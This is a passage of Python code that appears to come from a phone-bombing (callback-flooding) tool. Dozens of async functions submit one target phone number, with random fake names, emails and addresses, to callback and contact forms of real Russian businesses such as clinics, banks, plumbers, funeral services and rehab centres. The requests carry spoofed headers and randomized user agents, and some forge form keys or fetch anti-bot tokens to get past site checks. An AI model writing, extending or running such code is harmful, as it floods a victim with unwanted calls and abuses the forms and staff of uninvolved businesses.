    url = "https://tempo-plus.ru/local/templates/tempov2/ajax/connector.php"
    d = {"name":rn(),"phone":p["digits_7"],"action":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tempo-plus.ru","Referer":"https://tempo-plus.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_13689(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/13689/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка с сайта","requestUrl":"https://tempo-plus.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://tempo-plus.ru","Referer":"https://tempo-plus.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lakres_callback(s, p):
    url = "https://lakres.ru/obratnyj-zvonok"
    d = {"name":rn(),"phone":p["formatted"],"comment":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lakres.ru","Referer":"https://lakres.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lami24_cf7(s, p):
    url = "https://lami24.ru/wp-json/contact-form-7/v1/contact-forms/3523/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-email":re_(),"your-message":"Заявка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://lami24.ru","Referer":"https://lami24.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_optrf_callback(s, p):
    url = "https://optrf.ru/obratnyy-zvonok"
    token = await fetch_smart_token(s, "https://optrf.ru/")
    d = {"name":rn(),"phone":p["digits_7"]}
    if token: d["smart-token"] = token
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://optrf.ru","Referer":"https://optrf.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mcdog_cf7(s, p):
    url = "https://mcdog.ru/wp-json/contact-form-7/v1/contact-forms/5867/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна консультация ветеринара"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mcdog.ru","Referer":"https://mcdog.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santekhnikoff_callback(s, p):
    url = "https://santekhnikoff.ru/obratnyy-zvonok"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santekhnikoff.ru","Referer":"https://santekhnikoff.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gatchina_masterabyta_cf7(s, p):
    url = "https://gatchina.masterabyta.ru/wp-json/contact-form-7/v1/contact-forms/128/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен ремонт бытовой техники"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://gatchina.masterabyta.ru","Referer":"https://gatchina.masterabyta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_35146(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/35146/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://www.lenremont.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://www.lenremont.ru","Referer":"https://www.lenremont.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_botfaqtor_visit(s, p):
    url = "https://gw2.botfaqtor.ru/visit/35441/2"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://botfaqtor.ru","Referer":"https://botfaqtor.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vet03_callback(s, p):
    url = "https://vet-03.ru/bitrix/tools/cad_callback_simple.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужна помощь ветеринара"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://vet-03.ru","Referer":"https://vet-03.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_veterinarspb_cf7(s, p):
    url = "https://veterinarspb.com/wp-json/contact-form-7/v1/contact-forms/1679/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна ветеринарная помощь"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://veterinarspb.com","Referer":"https://veterinarspb.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bancaintesa_ajax(s, p):
    url = "https://www.bancaintesa.ru/ajx/add_form_result.php?AJAX_REQUEST=Y"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.bancaintesa.ru","Referer":"https://www.bancaintesa.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_snbank_callback(s, p):
    url = "https://www.snbank.ru/support/call_back/"
    d = {"name":rn(),"phone":p["digits_7"],"time":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.snbank.ru","Referer":"https://www.snbank.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn12_ajax(s, p):
    url = "https://xn--12-9kcqjffxnf3b.xn--p1ai/local/components/citrus.forms/base/ajax.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://xn--12-9kcqjffxnf3b.xn--p1ai","Referer":"https://xn--12-9kcqjffxnf3b.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bystrobank_callback(s, p):
    url = "https://www.bystrobank.ru/retailonline/web/callback.php"
    d = {"name":rn(),"phone":p["digits_7"],"calltime":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.bystrobank.ru","Referer":"https://www.bystrobank.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_cvetarius_feedback(s, p):
    url = "https://cvetarius.ru/feedback/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Заказ цветов"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://cvetarius.ru","Referer":"https://cvetarius.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_novayagollandiya_callback(s, p):
    url = "https://novayagollandiya.com/rest/request.callback/"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://novayagollandiya.com","Referer":"https://novayagollandiya.com/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_voevoda_bitrix(s, p):
    url = "https://voevoda.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://voevoda.bitrix24.ru","Referer":"https://voevoda.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lenremont_cf7(s, p):
    url = "https://www.lenremont.ru/wp-json/contact-form-7/v1/contact-forms/88288/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.lenremont.ru","Referer":"https://www.lenremont.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santehnik_uslugi_cf7(s, p):
    url = "https://www.santehnik-uslugi-elektrik-spb.ru/wp-json/contact-form-7/v1/contact-forms/5/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен сантехник или электрик"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.santehnik-uslugi-elektrik-spb.ru","Referer":"https://www.santehnik-uslugi-elektrik-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_callibri_callback(s, p):
    url = "https://in.callibri.ru/module/callibri_callback"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://callibri.ru","Referer":"https://callibri.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mka_spb_callback(s, p):
    url = "https://mka-spb.ru/main/callback_header_form"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mka-spb.ru","Referer":"https://mka-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_advokat_help_cf7(s, p):
    url = "https://advokat-help.spb.ru/wp-json/contact-form-7/v1/contact-forms/1106/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна юридическая консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://advokat-help.spb.ru","Referer":"https://advokat-help.spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_ritual(s, p):
    url = "https://spb.ritual.ru/local/api/form.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb.ritual.ru","Referer":"https://spb.ritual.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ratusha_thanks(s, p):
    url = "https://ratusha-pamyatniki.ru/thanks/"
    d = {"name":rn(),"phone":p["formatted"],"message":"Изготовление памятника"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://ratusha-pamyatniki.ru","Referer":"https://ratusha-pamyatniki.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn8sbecmvk6adqeriw(s, p):
    url = "https://xn----8sbecmvk6adqeriw.xn--p1ai/index.php?route=extension/module/callback"
    d = {"name":rn(),"phone":p["formatted"],"comment":"Заказ обратного звонка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://xn----8sbecmvk6adqeriw.xn--p1ai","Referer":"https://xn----8sbecmvk6adqeriw.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_cloudpbx_rt(s, p):
    url = "https://numbers.cloudpbx.rt.ru/widget/send_query/3483A7789A7087B98D7368E3560769CC"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://cloudpbx.rt.ru","Referer":"https://cloudpbx.rt.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ritual_doverie(s, p):
    url = "https://sankt-peterburg.ritual-doverie.com/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ звонка","f_Name":rn(),"f_Phone":p["raw"],"agree":"on"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://sankt-peterburg.ritual-doverie.com","Referer":"https://sankt-peterburg.ritual-doverie.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_globaldrive_callback(s, p):
    url = "https://globaldrive.ru/include/ajax/new_form.php?WEB_FORM_ID=1&formresult=addok&id=callback"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://globaldrive.ru","Referer":"https://globaldrive.ru/"}
    async with s.get(url, params=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tarantasik(s, p):
    url = "https://tarantasik.ru/sankt-peterburg/mototsikly/pitbayki/"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Интересует покупка мотоцикла"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tarantasik.ru","Referer":"https://tarantasik.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gettruck_recall(s, p):
    url = "https://api.gettruck.ru/api/FeedBack/Recall"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Нужна грузоперевозка"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://gettruck.ru","Referer":"https://gettruck.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gruzovichkof_spb(s, p):
    url = "https://gruzovichkof.ru/api/request"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Перевозка"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://gruzovichkof.ru","Referer":"https://gruzovichkof.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_glav_dostavka(s, p):
    url = "https://spb.glav-dostavka.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb.glav-dostavka.ru","Referer":"https://spb.glav-dostavka.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_profgruzspb(s, p):
    url = "https://profgruzspb.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://profgruzspb.ru","Referer":"https://profgruzspb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_spb_perevozka(s, p):
    url = "https://spb-perevozka.ru/mail/send_calc.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужна перевозка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb-perevozka.ru","Referer":"https://spb-perevozka.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_profinstitute_bitrix(s, p):
    url = "https://profinstitute.bitrix24.ru/bitrix/services/main/ajax.php?action=crm.site.form.fill"
    d = {"fields":{"NAME":rn(),"PHONE":[{"VALUE":p["digits_7"]}]}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://profinstitute.bitrix24.ru","Referer":"https://profinstitute.bitrix24.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zabirator_callback(s, p):
    url = "https://spb.zabirator.ru/obratniy-zvonok"
    d = {"name":rn(),"phone":p["formatted"],"item":"Вывоз мусора"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://spb.zabirator.ru","Referer":"https://spb.zabirator.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_washanyanya_cf7(s, p):
    url = "https://washanyanya.ru/wp-json/contact-form-7/v1/contact-forms/5/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужна уборка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://washanyanya.ru","Referer":"https://washanyanya.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_president_medical(s, p):
    url = "https://sankt-peterburg.president-medical.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://sankt-peterburg.president-medical.ru","Referer":"https://sankt-peterburg.president-medical.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mpkprognoz_cf7(s, p):
    url = "https://mpkprognoz.ru/wp-json/contact-form-7/v1/contact-forms/14914/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mpkprognoz.ru","Referer":"https://mpkprognoz.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_p27spb_cf7(s, p):
    url = "https://p27spb.ru/wp-json/contact-form-7/v1/contact-forms/10859/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://p27spb.ru","Referer":"https://p27spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_onkourologi(s, p):
    url = "https://onkourologi.ru/forms/sendanyform/"
    d = {"name":rn(),"phone":p["digits_7"],"form_name":"callback","message":"Нужна консультация онкоуролога"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://onkourologi.ru","Referer":"https://onkourologi.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stop_alko(s, p):
    url = "https://gatchina.stop-alko.com/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://gatchina.stop-alko.com","Referer":"https://gatchina.stop-alko.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_narnika(s, p):
    url = "https://narnika.ru/include/sendmail-book.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Консультация"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://narnika.ru","Referer":"https://narnika.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_doctoredet24(s, p):
    url = "https://doctoredet24.ru/includes/save_form.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"specialist":random.choice(MED_S),"comment":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://doctoredet24.ru","Referer":"https://doctoredet24.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_piter_bez_narkotikov(s, p):
    url = "https://piter-bez-narkotikov.ru/lechenie-narkomanii/snyatie-lomki-na-domu"
    d = {"name":rn(),"phone":p["formatted"],"comment":"Нужна срочная помощь"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://piter-bez-narkotikov.ru","Referer":"https://piter-bez-narkotikov.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_narkolog_express(s, p):
    url = "https://narkolog.express/netcat_template/ajax/request.php"
    d = {"name":rn(),"phone":p["digits_7"],"form_id":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://narkolog.express","Referer":"https://narkolog.express/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_doctor_spb(s, p):
    url = "https://doctor-spb.ru/novosti/besplatnaya-konsultacziya-urologa-v-spb.html"
    d = {"name":rn(),"phone":p["formatted"],"specialist":"Уролог","comment":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://doctor-spb.ru","Referer":"https://doctor-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mebelhit_spb(s, p):
    url = "https://mebelhit.spb.ru/bitrix/templates/dresscodeV2/components/bitrix/form.result.new/twoColumns/ajax.php?FORM_ID=2&SITE_ID=s1"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Заказ мебели"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mebelhit.spb.ru","Referer":"https://mebelhit.spb.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_formdesigner(s, p):
    url = "https://formdesigner.ru/form/iframe/198848?center=1&popup=1"
    d = {"name":rn(),"phone":p["formatted"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://formdesigner.ru","Referer":"https://formdesigner.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_santechnici(s, p):
    url = "https://tomsk.santechnici.ru/"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.santechnici.ru","Referer":"https://tomsk.santechnici.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santehnik70_zakaz(s, p):
    url = "https://santehnik70.ru/zakaz.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Вызов сантехника"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santehnik70.ru","Referer":"https://santehnik70.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_okmasterok(s, p):
    url = "https://tomsk.okmasterok.ru/sendmail.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.okmasterok.ru","Referer":"https://tomsk.okmasterok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_multiclinic(s, p):
    url = "https://multiclinic.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://multiclinic.ru","Referer":"https://multiclinic.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santehnikperm_cf7(s, p):
    url = "https://santehnikperm.com/wp-json/contact-form-7/v1/contact-forms/1679/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santehnikperm.com","Referer":"https://santehnikperm.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perm_fl99(s, p):
    url = "https://perm.fl99.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://perm.fl99.ru","Referer":"https://perm.fl99.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perm_gormaster(s, p):
    url = "https://perm.gor-master.ru/order/create"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Ремонт","address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://perm.gor-master.ru","Referer":"https://perm.gor-master.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_perm_profivdom(s, p):
    url = "https://perm.profivdom.ru/send-validate/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужен ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://perm.profivdom.ru","Referer":"https://perm.profivdom.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_santehnikoff(s, p):
    url = "https://volgograd.santehnikoff.com/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://volgograd.santehnikoff.com","Referer":"https://volgograd.santehnikoff.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_volgograd_okmasterok(s, p):
    url = "https://volgograd.okmasterok.ru/sendmail.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Нужен ремонт"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://volgograd.okmasterok.ru","Referer":"https://volgograd.okmasterok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_santehnik70_online(s, p):
    url = "https://santehnik70.ru/zakaz-online.php"
    d = {"name":rn(),"phone":p["digits_7"],"service":"Вызов сантехника","address":ra()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://santehnik70.ru","Referer":"https://santehnik70.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tomsk_santehniki_com(s, p):
    url = "https://tomsk.san-tehniki.com/send-validate/"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_(),"message":"Нужен сантехник"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://tomsk.san-tehniki.com","Referer":"https://tomsk.san-tehniki.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_1884(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/1884/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка с сайта","requestUrl":"https://doctor-spb.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://doctor-spb.ru","Referer":"https://doctor-spb.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mango_office(s, p):
    url = "https://mcw.mango-office.ru/multichannel/17209/orderCallback"
    d = {"name":rn(),"phone":p["digits_7"],"callTime":"Сейчас"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://mango-office.ru","Referer":"https://mango-office.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_fokus_komforta(s, p):
    url = "https://fokus-komforta.ru/wp-admin/admin-ajax.php?t=1777134334751"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","Origin":"https://fokus-komforta.ru","Referer":"https://fokus-komforta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_remontokon_company(s, p):
    url = "https://remontokon-company.ru/send1.php"
    d = {"name":rn(),"phone":p["digits_7"],"message":"Ремонт окон"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://remontokon-company.ru","Referer":"https://remontokon-company.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_14095(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/14095/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://fokus-komforta.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://fokus-komforta.ru","Referer":"https://fokus-komforta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_masterabyta_cf7(s, p):
    url = "https://pskov.masterabyta.ru/wp-json/contact-form-7/v1/contact-forms/127/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Нужен ремонт бытовой техники"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.masterabyta.ru","Referer":"https://pskov.masterabyta.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_remontgis(s, p):
    url = "https://pskov.remontgis.ru/%D0%BC%D1%83%D0%B6-%D0%BD%D0%B0-%D1%87%D0%B0%D1%81/%D0%BE%D0%B2%D1%81%D0%B8%D1%89%D0%B5"
    d = {"name":rn(),"phone":p["formatted"],"service":"Муж на час"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.remontgis.ru","Referer":"https://pskov.remontgis.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_pozitive(s, p):
    url = "https://pskov.pozitive.org/forma_orig.php"
    d = {"name":rn(),"phone":p["digits_7"],"email":re_()}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://pskov.pozitive.org","Referer":"https://pskov.pozitive.org/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pskov_evakuatorok(s, p):
    url = "https://pskov.evakuatorok.ru/ajax/callback"
